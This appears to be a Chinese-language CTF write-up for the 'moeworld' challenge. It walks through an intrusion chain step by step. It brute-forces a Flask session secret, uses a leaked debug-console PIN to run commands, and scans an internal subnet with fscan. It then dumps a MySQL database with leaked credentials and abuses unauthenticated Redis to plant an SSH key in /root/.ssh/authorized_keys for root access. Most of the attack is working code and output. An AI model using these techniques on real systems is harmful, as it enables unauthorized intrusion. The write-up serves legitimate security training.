@@ -1,0 +1,133 @@
+<h1 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h1><p>首先爆破secret key</p>
+<pre><code class="py">import itertools
+import zlib
+from flask.sessions import SecureCookieSessionInterface
+from itsdangerous import base64_decode
+#https://github.com/noraj/flask-session-cookie-manager
+class MockApp(object):
+    def __init__(self, secret_key):
+        self.secret_key = secret_key
+def encode(secret_key, session_cookie_structure):
+    try:
+        app = MockApp(secret_key)
+        session_cookie_structure = session_cookie_structure
+        si = SecureCookieSessionInterface()
+        s = si.get_signing_serializer(app)
+        return s.dumps(session_cookie_structure)
+    except Exception as e:
+        return &quot;[Encoding error] {}&quot;.format(e)
+def decode(session_cookie_value, secret_key=None):
+    if (secret_key == None):
+        compressed = False
+        payload = session_cookie_value
+        if payload.startswith(&#39;.&#39;):
+            compressed = True
+            payload = payload[1:]
+        data = payload.split(&quot;.&quot;)[0]
+        data = base64_decode(data)
+        if compressed:
+            data = zlib.decompress(data)
+        return data
+    else:
+        app = MockApp(secret_key)
+        si = SecureCookieSessionInterface()
+        s = si.get_signing_serializer(app)
+        return s.loads(session_cookie_value)
+cookie = &quot;&quot;
+for c in itertools.product(range(0, 256), repeat=2):
+    k = bytes(c).hex()
+    try:
+        print(decode(cookie, &quot;This-random-secretKey-you-can&#39;t-get&quot;+k))
+    except Exception as e:
+        pass
+    else:
+        print(k)
+        break
+</code></pre>
+<p>secret key是<code>This-random-secretKey-you-can&#39;t-get06f0</code>,有了secret key就能自己修改session为admin。admin的private留言说pin码904-474-531，所以去到<a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a> ，输入pin码则获得console</p>
+<p>执行系统命令：</p>
+<pre><code class="py">import subprocess
+subprocess.check_output([&#39;ls&#39;,&#39;/&#39;])
+subprocess.check_output([&#39;cat&#39;,&#39;/flag&#39;])
+</code></pre>
+<p>获得第一部分flag：<code>moectf{Information-leakage-Is-dangerous!</code></p>
+<p>还有个readme，python decode后看到提示</p>
+<pre><code>恭喜你通过外网渗透拿下了本台服务器的权限
+接下来，你需要尝试内网渗透，本服务器的/app/tools目录下内置了fscan
+你需要了解它的基本用法，然后扫描内网的ip段
+如果你进行了正确的操作，会得到类似下面的结果
+10.1.11.11:22 open
+10.1.23.21:8080 open
+10.1.23.23:9000 open
+将你得到的若干个端口号从小到大排序并以 - 分割，这一串即为hint.zip压缩包的密码（本例中，密码为：22-8080-9000）
+注意：请忽略掉xx.xx.xx.1，例如扫出三个ip 192.168.0.1 192.168.0.2 192.168.0.3 ，请忽略掉有关192.168.0.1的所有结果！此为出题人服务器上的其它正常服务
+对密码有疑问随时咨询出题人
+</code></pre>
+<p>提示用fscan，看一下help</p>
+<pre><code class="py">subprocess.check_output(&quot;/app/tools/fscan --help&quot;,stderr=subprocess.STDOUT,shell=True)
+</code></pre>
+<p>是这个工具： <a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p>
+<p>看一下本机内网ip, 参考 <a href="https://blog.csdn.net/kuanggudejimo/article/details/99454185">https://blog.csdn.net/kuanggudejimo/article/details/99454185</a></p>
+<pre><code class="py">import socket;s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);s.connect((&#39;8.8.8.8&#39;, 80));ip = s.getsockname()[0];print(ip)
+</code></pre>
+<p>得到ip为<code>172.21.0.2</code>。扫描：</p>
+<pre><code class="py">subprocess.check_output(&quot;/app/tools/fscan -h 127.21.0.2/24&quot;,stderr=subprocess.STDOUT,shell=True)
+</code></pre>
+<p>得到hint.zip密码： 22-3306-6379-8080</p>
+<p>然后不要卡在怎么配置frp进行内网穿透，那个要自己开vps，或者要有个自己的公网ip。穿透只是辅助效果，帮助我们渗透更加方便，不配置直接用python console也是可以的。也不要想用ngrok免费版，免费版只能转发一个端口，而穿透至少要两个端口。直接去搞mysql：</p>
+<pre><code class="py">subprocess.check_output(&quot;cat dataSql.py&quot;,stderr=subprocess.STDOUT,shell=True)
+</code></pre>
+<p>得到sql数据库交互的源码，里面有用户名和密码。连接:</p>
+<pre><code class="py">db = pymysql.connect(host=&quot;mysql&quot;,port=3306,user=&quot;root&quot;,passwd=&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;,database=&quot;messageboard&quot;,charset=&#39;utf8&#39;)
+</code></pre>
+<p>查内容：</p>
+<pre><code class="py">cursor=db.cursor()
+cursor.execute(&quot;select database()&quot;)
+cursor.fetchall()
+((&#39;messageboard&#39;))
+&gt;&gt;&gt; cursor.execute(&quot;select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#39;messageboard&#39;&quot;)
+1
+&gt;&gt;&gt; cursor.fetchall()
+((&#39;flag,message,users&#39;))
+&gt;&gt;&gt; cursor.execute(&quot;select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)&quot;)
+1
+&gt;&gt;&gt; cursor.fetchall()
+((&#39;flag&#39;))
+&gt;&gt;&gt; cursor.execute(&quot;select(group_concat(flag))from(flag)&quot;)
+1
+&gt;&gt;&gt; cursor.fetchall()
+((&#39;-Are-YOu-myS0L-MasT3r?-&#39;))
+</code></pre>
+<p>最后是redis。用python装个redis模块（不知道为啥apt-get install装不了？）：</p>
+<pre><code class="py">subprocess.check_output(&quot;pip3 install redis&quot;,stderr=subprocess.STDOUT,shell=True)
+</code></pre>
+<p>然后连接</p>
+<pre><code class="py">r = redis.Redis(host=&#39;172.20.0.3&#39;, port=6379, db=0)
+r.info()
+</code></pre>
+<p>从info中得知redis存在未授权访问漏洞。根据 https:&#x2F;&#x2F;_thorns.gitbooks.io&#x2F;sec&#x2F;content&#x2F;redis_getshellzi_dong_hua_shi_jian_zhi_ssh_key.html 往root写ssh key。public_key和privkey利用<code>ssh-keygen -t rsa</code>生成</p>
+<pre><code class="py">&gt;&gt;&gt; r.set(&#39;aaaaaaaaaa&#39;, &#39;\n\n&#39; + public_key + &#39;\n\n&#39;)
+True
+&gt;&gt;&gt; r.config_set(&#39;dir&#39;, &#39;/root/.ssh&#39;)
+True
+&gt;&gt;&gt; r.config_set(&#39;dbfilename&#39;, &#39;authorized_keys&#39;)
+True
+&gt;&gt;&gt; r.save()
+True
+</code></pre>
+<p>参考 <a href="https://www.cnblogs.com/wongbingming/articles/12384764.html">https://www.cnblogs.com/wongbingming/articles/12384764.html</a> ，安装paramiko进行ssh连接</p>
+<pre><code class="py">subprocess.check_output(&quot;pip3 install paramiko&quot;,stderr=subprocess.STDOUT,shell=True)
+import paramiko
+&gt;&gt;&gt; pkey = paramiko.RSAKey.from_private_key_file(&#39;privkey&#39;, password=&#39;&#39;)
+&gt;&gt;&gt; trans = paramiko.Transport((&#39;172.20.0.3&#39;, 22))
+&gt;&gt;&gt; trans.connect(username=&#39;root&#39;, pkey=pkey)
+&gt;&gt;&gt; ssh = paramiko.SSHClient()
+&gt;&gt;&gt; ssh._transport = trans
+&gt;&gt;&gt; stdin, stdout, stderr = ssh.exec_command(&#39;ls /&#39;)
+&gt;&gt;&gt; print(stdout.read().decode())
+&gt;&gt;&gt; stdin, stdout, stderr = ssh.exec_command(&#39;cat /flag&#39;)
+&gt;&gt;&gt; print(stdout.read().decode())
+</code></pre>
+<h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote>
+<p>moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}</p>
+</blockquote>
